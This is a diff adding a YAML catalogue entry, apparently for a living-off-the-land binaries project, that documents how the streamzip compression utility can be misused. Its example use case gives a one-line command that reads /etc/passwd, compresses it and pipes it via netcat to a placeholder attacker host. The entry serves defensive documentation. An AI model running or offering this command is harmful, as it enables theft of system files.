@@ -1,0 +1,23 @@
+name: streamzip
+author: Gabriel De Jesus (0xv1n)
+short_description: File-less compression of data passed in through stdin.
+full_description: streamzip is a system utility that can be utilized to compress data from "stdin" and write the data directly to "stdout", no temporary files are created. The tool can be used by malicious actors to collect and exfiltrate sensitive data without leaving staged data archive artifacts on disk.
+created: 2024-07-15
+example_use_cases:
+  - name: Copy and compress sensitive data locally
+    description: The following command reads file data and compresses the data for exfiltration
+    code: dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT
+    tactics:
+      - Collection
+      - Exfiltration
+    tags:
+      - files
+      - compress
+paths:
+  - /usr/bin/streamzip
+detections:
+  - name: No detection content at time of writing
+    url: N/A
+resources:
+  - name: streamzip man page
+    url: https://docs.oracle.com/cd/E88353_01/html/E37839/streamzip-1.html
